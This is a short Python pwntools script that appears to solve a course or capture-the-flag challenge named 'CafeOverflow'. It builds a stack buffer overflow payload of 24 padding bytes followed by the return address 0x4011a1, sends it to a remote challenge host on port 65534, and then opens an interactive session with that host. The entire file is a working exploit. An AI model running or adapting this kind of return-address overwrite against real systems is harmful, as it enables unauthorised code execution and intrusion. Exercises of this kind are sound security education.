#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
#context.log_level = 'debug'

# Byte sequence alias
A8 = 8 * b'A'


def main():
    payload = 3 * A8
    payload += p64(0x4011a1)

    #proc = process('./CafeOverflow')
    proc = remote('hw00.zoolab.org', 65534)
    proc.recvuntil(':')
    proc.send(payload)
    proc.interactive()


if __name__ == '__main__':
    main()
